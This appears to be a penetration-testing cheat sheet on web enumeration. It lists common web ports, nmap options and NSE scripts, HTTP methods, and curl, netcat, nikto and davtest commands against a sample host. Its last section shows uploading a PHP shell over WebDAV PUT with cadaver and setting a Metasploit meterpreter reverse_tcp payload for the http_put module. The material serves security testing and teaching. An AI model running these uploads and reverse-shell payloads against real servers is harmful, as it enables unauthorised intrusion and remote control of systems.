## Web Enumeration

Web enumeration means to look out info about services running on port, versions, languages, directories and more.

## Most Useful web ports.

| Service | Port No. | Protocol |
|---------|----------|----------|
| HTTP | 80,8080,8081,8000 | TCP |
| HTTPS | 443,8443,4443 | TCP |
| Tomcat Startup | 8080 | TCP |
| Tomcat Startup (SSL) | 8443 | TCP |
| Tomcat Shutdown | 8005 | TCP |
| Tomcat AJP Connector | 8009 | TCP |
| Glassfish HTTP | 8080 | TCP |
| Glassfish HTTPS | 8181 | TCP |
| Glassfish Admin Server | 4848 | TCP |
| Jetty | 8080 | TCP |
| Jonas Admin Console | 9000 | TCP |

## nmap

	  -Pn: Treat all hosts as online -- skip host discovery
	  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
	  -p <port ranges>: Only scan specified ports
	  -sV: Probe open ports to determine service/version info
	  -sC: equivalent to --script=default
	  --script=<Lua scripts>: <Lua scripts> is a comma separated list of
		   directories, script-files or script-categories
	  -O: Enable OS detection
	  -oA <basename>: Output in the three major formats at once
	  -v: Increase verbosity level (use -vv or more for greater effect)
	  -A: Enable OS detection, version detection, script scanning, and traceroute

## Finding Open Ports

	# nmap -sT -v -p- $IP

	# nmap -sT -v -p- -oA allports $IP ##Save Output in File

	# nmap -Pn -sT -v -p- $IP

## Check Running Service Version

	# nmap -sT -sV -sC -A -O -v -p 80,443 $IP

	# nmap -Pn -sT -sV -sC -A -O -v -p 80,443 $IP

## Obtaining Information using nmap Scripts

	# ls /usr/share/nmap/scripts/ | grep http

	# nmap -sT -sV -v -p 80,443 --script=http-enum.nse $IP

	# nmap -sT -sV -v -p 80,443 --script=http-php-version.nse $IP

	# nmap -sT -sV -v -p 80,443 --script=http-put.nse $IP

	# nmap -sT -sV -v -p 80,443 --script=http-shellshock.nse $IP

	# nmap -sT -sV -v -p 80,443 --script=http-slowloris.nse $IP

	# nmap -sT -sV -v -p 80,443 --script=http-vhosts.nse $IP

## HTTP Method

| Method | Syntax | Description |
|--------|--------|-------------|
| GET | GET /index.html |GET method requests a representation of the specified resource. Requests using GET should only retrieve data. |
| HEAD | HEAD /index.html |HEAD method requests the headers that would be returned if the HEAD request's URL was instead requested with the HTTP GET method.  |
| POST | POST /test |POST method is used to submit an entity to the specified resource, often causing a change in state or side effects on the server. |
| PUT | PUT /new.html HTTP/1.1 | The PUT method replaces all current representations of the target resource with the request payload. |
| DELETE | DELETE /file.html HTTP/1.1 |DELETE request method deletes the specified resource. |
| CONNECT | CONNECT www.example.com:443 HTTP/1.1 |CONNECT method starts two-way communications with the requested resource. It can be used to open a tunnel. |
| OPTIONS | OPTIONS /index.html HTTP/1.1 |OPTIONS method requests permitted communication options for a given URL or server. A client can specify a URL with this method, or an asterisk (*) to refer to the entire server. |
| TRACE | TRACE /index.html |TRACE method performs a message loop-back test along the path to the target resource, providing a useful debugging mechanism. |
| PATCH | PATCH /file.txt HTTP/1.1 |PATCH request method applies partial modifications to a resource. |

Detecting Available Methods 

	# nmap -sT -sV -v -p 80,443 --script=http-methods.nse $IP

	# nmap -sT -sV -v -p 80,443 --script=http-method-tamper.nse $IP

If PUT method is allow so we can use below commands to upload file.

	# nmap -p 80 --script http-methods --script-args http-methods.url-path='/index.php' $IP

	# nmap -p 80 --script http-methods --script-args http-method.test-all ='/192.168.1.100' 192.168.1.100

	# nmap -p 80 192.168.1.100 --script http-put --script-args http-put.url='/dav/test.php',http-put.file='/dev/shm/test.php'

We can also use nc / netcat to check available methods.

	# nc 192.168.1.100 80
		HEAD /admin HTTP/1.1

	# nc 192.168.1.100 80
		TRACE / HTTP/1.1

	# nc 192.168.1.100 80
		OPTIONS  http://192.168.1.100 / HTTP/1.0
		
Below are the basic tools to enumerate about available methods.

	# curl -X GET 192.168.1.100

	# curl -X OPTIONS 192.168.1.100

	# curl -X OPTIONS 192.168.1.100/webdev -v

	# curl -X POST 192.168.1.100

	# curl -X PUT 192.168.1.100/uploads

	# curl -X DELETE 192.168.1.100

	# curl 192.168.1.100/uploads --upload-file demo.txt

	# curl -I 192.168.1.100

	# nikto -h 192.168.1.100

	# davtest --help

	# davtest -url http://192.168.1.100/dav/

	# cadaver --help

	# cadaver http://192.168.1.100/dav/
		put /dev/shm/shell.php

	# msfconsole
		msf> use auxiliary/scanner/http/http_put
		msf>auxiliary (http_put) > set rhosts 192.168.1.100
		msf>auxiliary (http_put) > set payload php/meterpreter/reverse_tcp
		msf>auxiliary (http_put) > set path /dav/
		msf>auxiliary (http_put) > set filename meter.php
		msf>auxiliary (http_put) > set filedata file://root/Desktop/meter.php
		msf>auxiliary (http_put) > exploit
